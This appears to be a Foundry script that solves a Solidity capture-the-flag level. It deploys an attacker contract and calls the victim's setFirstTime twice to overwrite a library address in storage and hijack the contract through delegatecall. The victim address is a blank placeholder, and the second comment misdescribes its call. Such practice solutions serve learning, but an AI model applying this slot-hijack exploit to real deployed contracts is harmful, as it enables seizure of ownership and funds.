//SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script} from "forge-std/Script.sol";
import {Solving} from "src/Solving.sol";

contract SolvingScript is Script {

    Solving solving;
    address victim = ; /* Your instance address */

    function run() public {
        vm.startBroadcast();

        solving = new Solving();

        // Changing the address `timeZone1Library` to the address of our smart contract
        victim.call(abi.encodeWithSignature("setFirstTime(uint256)", uint256(uint160(address(solving)))));

        // Changing the address `timeZone2Library` to our address
        victim.call(abi.encodeWithSignature("setFirstTime(uint256)", uint256(0)));
    }
}